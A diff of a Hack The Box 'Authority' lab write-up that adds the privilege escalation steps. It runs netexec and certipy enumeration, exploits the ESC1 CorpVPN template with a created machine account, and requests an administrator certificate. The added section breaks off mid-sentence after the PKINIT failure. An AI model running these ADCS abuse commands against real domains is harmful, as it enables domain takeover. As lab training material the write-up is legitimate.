@@ -201,7 +201,7 @@ Before we fall down a password bruteforcing rabbit hole early on, let's continue
 
 ### SMB (445/TCP)
 ```console
-0ph3@parrot~$ cme smb 10.10.11.222 -u 0ph3 -p '' --shares
+0ph3@parrot~$ netexec smb 10.10.11.222 -u 0ph3 -p '' --shares
 SMB         10.10.11.222    445    AUTHORITY        [*] Windows 10.0 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False)
 SMB         10.10.11.222    445    AUTHORITY        [+] authority.htb\0ph3: 
 SMB         10.10.11.222    445    AUTHORITY        [*] Enumerated shares
@@ -238,8 +238,9 @@ The share appears to host folders for different services under the Automation/An
 If you are unfamiliar with [Ansible](https://docs.ansible.com/ansible/latest/getting_started/introduction.html), know that it is essentially software used to automate complex tasks.
 It is often used by development teams and IT professionals to automatically deploy, maintain, update and manage software/system components and configurations amongst other uses.
 That being said, the PWM folder looks interesting. With some luck, there may be stored credentials to the PWM login page that we found.
+It's also worth noting the ADCS folder. There's a good chance ADCS is installed on the DC. We can keep this in mind but for now, let's check the PWM folder.
 
-```ansible_inventory``` file seems to contain winrm credentials.
+The ```Automation/Ansible/PWM/ansible_inventory``` file seems to contain winrm credentials.
 ```console
 0ph3@parrot~$ cat /mnt/authority/development/Automation/Ansible/PWM/ansible_inventory 
 ansible_user: administrator
@@ -251,7 +252,7 @@ ansible_winrm_server_cert_validation: ignore
 ```
 Trying the winrm credentials against the DC fails
 ```console
-0ph3@parrot~$ cme winrm authority.htb -u Administrator -p Welcome1
+0ph3@parrot~$ netexec winrm authority.htb -u Administrator -p Welcome1
 SMB         authority.htb   5985   AUTHORITY        [*] Windows 10.0 Build 17763 (name:AUTHORITY) (domain:authority.htb)
 HTTP        authority.htb   5985   AUTHORITY        [*] http://authority.htb:5985/wsman
 HTTP        authority.htb   5985   AUTHORITY        [-] authority.htb\Administrator:Welcome1 
@@ -444,5 +445,182 @@ Mode                LastWriteTime         Length Name
 ```
 
 ## Privilege Escalation
+### Local Enumeration
+Let's gain some situational awareness about our current user to see if we are a part of any privileged groups or have any potentially eexploitable privileges.
 
+Nothing notable for user privileges
+```console
+*Evil-WinRM* PS C:\Users\svc_ldap\desktop> whoami /priv
+                                               
+PRIVILEGES INFORMATION
+----------------------    
+                                               
+Privilege Name                Description                    State
+============================= ============================== =======
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+
+```
+
+We don't see to be a member of any groups we could use to elevate privileges but the presence of ```BUILTIN\Certificate Service DCOM Access``` is interesting. This might confirm our suspicions that the DC might have ADCS installed.
+```console
+*Evil-WinRM* PS C:\Users\svc_ldap\desktop> whoami /groups
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                  Type             SID          Attributes
+=========================================== ================ ============ ==================================================
+Everyone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Management Users             Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Certificate Service DCOM Access     Alias            S-1-5-32-574 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
+Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
+```
+
+### ADCS Enumeration
+Certificate templates are not inherently exploitable but like with anything else, misconfigurations can lead to domain privilege escalation. Let's use the [certipy](https://github.com/ly4k/Certipy) tool to check if the there are any vulnerable certificate templates we can abuse. We can use certipy's ```find``` command with the ```-vulnerable``` switch to look for vulnerable certificate templates.
+```console
+0ph3@parrot~$ certipy find -stdout -vulnerable -text -u svc_ldap -p 'lDaP_1n_th3_cle4r!' -target authority.htb
+<SNIP>
+[*] Enumeration output:                       
+Certificate Authorities
+  0                         
+    CA Name                             : AUTHORITY-CA                  
+    DNS Name                            : authority.authority.htb    
+    Certificate Subject                 : CN=AUTHORITY-CA, DC=authority, DC=htb
+    Certificate Serial Number           : 2C4E1F3CA46BBDAF42A1DDE3EC33A6B4
+    Certificate Validity Start          : 2023-04-24 01:46:26+00:00  
+    Certificate Validity End            : 2123-04-24 01:56:25+00:00  
+    Web Enrollment                      : Disabled                       
+    User Specified SAN                  : Unknown                    
+    Request Disposition                 : Unknown                    
+    Enforce Encryption for Requests     : Unknown                        
+Certificate Templates                                                                          
+  0                                                                                            
+    Template Name                       : CorpVPN                        
+    Display Name                        : Corp VPN                   
+    Certificate Authorities             : AUTHORITY-CA
+    Enabled                             : True                                                                                                                                                
+    Client Authentication               : True
+    Enrollment Agent                    : False 
+    Any Purpose                         : False 
+    Enrollee Supplies Subject           : True
+    Certificate Name Flag               : EnrolleeSuppliesSubject
+    Enrollment Flag                     : AutoEnrollmentCheckUserDsCertificate
+                                          PublishToDs
+                                          IncludeSymmetricAlgorithms
+    Private Key Flag                    : 16777216
+                                          65536 
+                                          ExportableKey
+    Extended Key Usage                  : Encrypting File System
+                                          Secure Email
+                                          Client Authentication
+                                          Document Signing
+                                          IP security IKE intermediate
+                                          IP security use
+                                          KDC Authentication
+    Requires Manager Approval           : False 
+    Requires Key Archival               : False 
+    Authorized Signatures Required      : 0
+    Validity Period                     : 20 years
+    Renewal Period                      : 6 weeks
+    Minimum RSA Key Length              : 2048
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights               : AUTHORITY.HTB\Domain Computers
+                                          AUTHORITY.HTB\Domain Admins
+                                          AUTHORITY.HTB\Enterprise Admins
+      Object Control Permissions
+        Owner                           : AUTHORITY.HTB\Administrator
+        Write Owner Principals          : AUTHORITY.HTB\Domain Admins
+                                          AUTHORITY.HTB\Enterprise Admins
+                                          AUTHORITY.HTB\Administrator
+        Write Dacl Principals           : AUTHORITY.HTB\Domain Admins
+                                          AUTHORITY.HTB\Enterprise Admins
+                                          AUTHORITY.HTB\Administrator
+        Write Property Principals       : AUTHORITY.HTB\Domain Admins
+                                          AUTHORITY.HTB\Enterprise Admins
+                                          AUTHORITY.HTB\Administrator
+    [!] Vulnerabilities
+      ESC1                              : 'AUTHORITY.HTB\\Domain Computers' can enroll, enrollee supplies subject and template allows client authentication
+
+```
+From the output, it looks like ```CorpVPN``` certificate is vulnerable to ESC1. A certificate template is vulnerable to ESC1 when the template allows low privileged groups, like members of Domain Users, to define an arbitrary user as the Subject Alternative Name (SAN) for a certificate request that can be used for client authentication. Effectively, a low privilege user could request a certificate with a high privilege user, like a domain admin, in the SAN and then use the certificate to authenticate as that user to domain resources ultimately leading to domain compromise.
+
+### Exploiting ESC1
+Currently, our plan of attack is to request a certificate with the domain admin account, ```AUTHORITY.HTB\Administrator```, defined in the SAN. We'll then use the certificate to authenticate via kerberos to the domain controller and extract the DA's nthash then connect to the DC as the DA account and finally retrieve the flag.
+
+Looking at the ```certipy``` output, the only low privilege group that has enrollment rights for the template is ```AUTHORITY.HTB\Domain Computers```. We won't be able to directly use our ```svc_ldap``` user to request a certificate. We need to somehow gain access to a machine account. Fortunately for us, the ```MachineAccountQuota``` domain setting in AD allows unprivileged users the ability to add up to 10 machine accounts to the domain by default. Let's check if this setting is still set to the default value of 10, the easiest way is with netexec (formerly CrackMapExec, RIP in peace).
+
+```console
+0ph3@parrot~$ netexec ldap 10.10.11.222 -u svc_ldap -p 'lDaP_1n_th3_cle4r!' -M MAQ
+SMB         10.10.11.222    445    AUTHORITY        [*] Windows 10.0 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False)
+LDAPS       10.10.11.222    636    AUTHORITY        [+] authority.htb\svc_ldap:lDaP_1n_th3_cle4r! 
+MAQ         10.10.11.222    389    AUTHORITY        [*] Getting the MachineAccountQuota
+MAQ         10.10.11.222    389    AUTHORITY        MachineAccountQuota: 10
+```
+Nice, it looks like the default value is still in place! Let's use the ```addcomputer.py``` from the [impacket](https://github.com/fortra/impacket) toolkit to create our new machine account.
+```console
+0ph3@parrot~$ addcomputer.py 'authority.htb/svc_ldap:lDaP_1n_th3_cle4r!' -computer-name HACK01 -computer-pass 55a4a721e13c7bcfc8ac37bf6bd287f2 -method LDAPS -dc-ip 10.10.11.222
+Impacket v0.10.1.dev1+20230511.163246.f3d0b9e5 - Copyright 2022 Fortra
+
+[*] Successfully added machine account HACK01$ with password 55a4a721e13c7bcfc8ac37bf6bd287f2.
+```
+
+With the machine account created, we can request a certificate with the domain admin user as the SAN.
+To make the request, we will need to make sure we know the CA name (```-ca```), our vulnerable template name (```-template```) and the User Principle Name of our target user (```-upn```) to ```certipy```
+All of the information needed can be retrieved from the previous ```certipy find``` command output.
+```console
+0ph3@parrot~$ certipy req -username 'HACK01$' -password '55a4a721e13c7bcfc8ac37bf6bd287f2' -dc-ip 10.10.11.222 -ca 'AUTHORITY-CA' -template CorpVPN -upn 'administrator@authority.htb' -dns authority.htb -debug
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[+] Generating RSA key
+[*] Requesting certificate via RPC
+[+] Trying to connect to endpoint: ncacn_np:10.10.11.222[\pipe\cert]
+[+] Connected to endpoint: ncacn_np:10.10.11.222[\pipe\cert]
+[*] Successfully requested certificate
+[*] Request ID is 4
+[*] Got certificate with multiple identifications
+    UPN: 'administrator@authority.htb'
+    DNS Host Name: 'authority.htb'
+[*] Certificate has no object SID
+[*] Saved certificate and private key to 'administrator_authority.pfx'
+
+```
+
+The certificate and private key is saved to the ```administrator_authority.pfx``` file
+
+```console
+0ph3@parrot~$ ls
+administrator_authority.pfx
+```
+ Let's try to use the ```certify auth``` command to grab grab the administrator's TGT and NTHASH.
+```console
+certipy auth -pfx administrator_authority.pfx -debug
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Found multiple identifications in certificate
+[*] Please select one:
+    [0] UPN: 'administrator@authority.htb'
+    [1] DNS Host Name: 'authority.htb'
+> 0
+[+] Trying to resolve 'authority.htb' at '8.8.8.8'
+[*] Using principal: administrator@authority.htb
+[*] Trying to get TGT...
+[-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)
+```
+Looks like that failed. After researching the ```KDC_ERR_PADATA_TYPE_NOSUPP``` error, it appears that the domain controller is not configured to use PKINIT authentication. According to this [article](https://www.prosec-networks.com/en/blog/adcs-privescaas/), PKINIT is the kerberos authentication method that enables pre-authentication using certificates. The articles details an alternative method of certificate authentication and exploitation though. It's possible to use Schannel to authenticated against an ldaps server using X.509 certificates. The article links to the PassTheCert tool which takes advantage of this and grant a machine account we control [Resource Based Constrained Delegation (RBCD).](https://www.thehacker.recipes/a-d/movement/kerberos/delegations/rbcd) over ther Domain Controller.
+
+In short, since we have genericWrite access to the domain account RBCD through the ldaps certificate authentication, we can edit the DC's msDS-AllowedToActOnBehalfOfOtherIdentity and add our machine account's ( ```HACK01$```) SID to gain delegation over the DC. This will allow us to request a service ticket to the DC for any user we wish to impersonate([Silver Ticket](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/silver-ticket).
+
+Let's clone the PassTheTicket tool
+### PassTheCert RBCD
+The 
 
